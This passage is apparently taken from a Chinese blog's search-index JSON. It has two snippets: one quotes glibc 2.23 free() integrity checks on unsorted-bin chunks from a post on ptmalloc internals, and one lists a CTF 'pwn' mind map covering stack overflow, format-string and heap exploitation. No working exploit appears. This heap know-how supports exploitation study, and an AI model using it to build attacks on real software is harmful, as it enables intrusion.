unsorted_bin-\u003efd-\u003ebk是否不等于unsorted_bin 如果是，则goto errout (errstr = “free(): corrupted unsorted chunks” bck = unsorted_chunks(av); fwd = bck-\u003efd; if (__glibc_unlikely (fwd-\u003ebk != bck)) { errstr = \"free(): corrupted unsorted chunks\"; goto errout; } 将chunk插入unsortedbin(bk处),如果chunk_size不在s","date":"2019-10-06","objectID":"/ptmalloc/:2:2","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态漏洞利用"],"content":" 根据ctf-wiki总结栈溢出, 格式化字符串漏洞, 部分堆溢出利用, 制成如下思维导图 pwn.pdf ","date":"2019-09-21","objectID":"/pwn/:0:0","tags":["linux","pwn","思维导图"],"title":"Pwn思维导图","uri":"/pwn/"}]